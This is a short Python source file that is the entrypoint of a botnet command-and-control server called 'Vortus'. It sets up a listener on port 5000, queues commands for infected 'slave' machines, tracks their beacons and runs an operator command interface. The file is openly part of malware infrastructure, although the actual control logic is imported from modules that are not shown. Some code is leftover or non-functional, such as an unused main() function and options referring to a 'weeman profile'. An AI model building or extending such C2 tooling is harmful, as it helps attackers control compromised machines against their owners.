import sys
import optparse
import queue

from core.commands import CommandHandler
from core.interface import create_interface
from core.server import ResponseHandler
from collections import OrderedDict
from core import logger
from data.state import VortusState

def main():
    parser = optparse.OptionParser()
    parser.add_option("-q", "--quiet", dest="quiet_mode_opt", action="store_true", default=False, help="Runs without displaying the banner.")
    parser.add_option("-p", "--profile", dest="profile", help="Load weeman profile.")
    options,r = parser.parse_args()

    if options.profile:
        from core.shell import Shell
        pass
    else:
        from core.shell import Shell
        shell = Shell()
        shell.shell()


class Vortus(object):
    """
    This is the entrypoint point of the botnet C2. 
    """
    def __init__(self, host="0.0.0.0", port=5000):
        self.host = host
        self.port = port
        
        self.message_queues = OrderedDict({'all': queue.Queue()})
        self.response_queue = queue.Queue()
        self.slave2beacon = OrderedDict() 

        VortusState.create_collection("slaves")

    def parse_args(self):
        parser = optparse.OptionParser()
        parser.add_option("-q", "--quiet", dest="quiet_mode_opt", action="store_true", default=False, help="Runs without displaying the banner.")
        parser.add_option("-p", "--profile", dest="profile", help="Load weeman profile.")
        self.options,self.r = parser.parse_args()
        

    def start(self):
        self.parse_args()

        # Create Interface
        command_interface = create_interface(CommandHandler, mqs=self.message_queues,
                                             slave2beacon=self.slave2beacon, rq=self.response_queue)
        
        # Start Response Thread
        response_handler = ResponseHandler(self.response_queue, self.slave2beacon, command_interface)
        response_handler.start()

        # Start Interface Loop (Blocking)
        command_interface.main()

    

if __name__ == '__main__':
    vortus = Vortus()
    vortus.start()